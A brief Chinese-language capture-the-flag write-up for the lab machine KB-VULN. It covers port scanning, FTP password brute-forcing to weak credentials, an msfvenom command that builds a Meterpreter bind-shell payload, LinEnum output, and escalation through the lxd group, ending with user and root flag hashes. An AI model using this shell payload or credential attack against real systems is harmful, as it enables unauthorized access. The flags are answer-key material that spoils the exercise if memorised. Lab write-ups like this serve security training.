# KB-VULN

100.100.1.25



## 端口扫描

```
21/tcp  open     ftp vsFTPd 3.0.3
22/tcp  open     ssh
25/tcp  open     smtp
80/tcp  open     http
110/tcp open     pop3
```





### ftp

通过爆破得到密码：`sysadmin:password1`

user.txt:`48a365b4ce1e322a55ae9017f3daf0c0`:sysadmin



### ssh

密码也是：password1





## 信息收集

```
Benjamin Stone
Katleen Stone
Sadie White
Jerome Jensen

```



### back.txt

```
{"1":{"ID":1,"name":"My icons collection","bookmark_id":"59no1thgiy900000","created":null,"updated":1553168788,"active":1,"source":"local","order":0,"color":"000000","status":1},"59no1thgiy900000":[{"id":126488,"team":0,"name":"download","color":"#000000","premium":0,"sort":2},{"id":126512,"team":0,"name":"monitor","color":"#000000","premium":0,"sort":3},{"id":126500,"team":0,"name":"chat","color":"#000000","premium":0,"sort":4},{"id":126514,"team":0,"name":"glasses","color":"#000000","premium":0,"sort":5},{"id":126507,"team":0,"name":"vector","color":"#000000","premium":0,"sort":6},{"id":126502,"team":0,"name":"reload","color":"#000000","premium":0,"sort":1}]}
```

### f12

```
 <!-- Username : sysadmin -->
```



## 提权

```
msfvenom -p linux/x86/meterpreter/bind_tcp -a x86 -f elf  RHOST=100.100.1.25 LPORT=60080  > fuck#采用正向连接
```



sysinfo

```
Computer     : 100.100.1.25
OS           : Ubuntu 18.04 (Linux 4.15.0-112-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
```



用`LinEnum.sh`检查权限配置

结果：

```shell
[+] We're a member of the (lxd) group - could possibly misuse these rights!
uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```



https://www.freebuf.com/articles/system/216803.html

lxd提权！！！



拿到flag

```
root@kb-server:/# cat /root/flag.txt 
1eedddf9fff436e6648b5e51cb0d2ec7
```

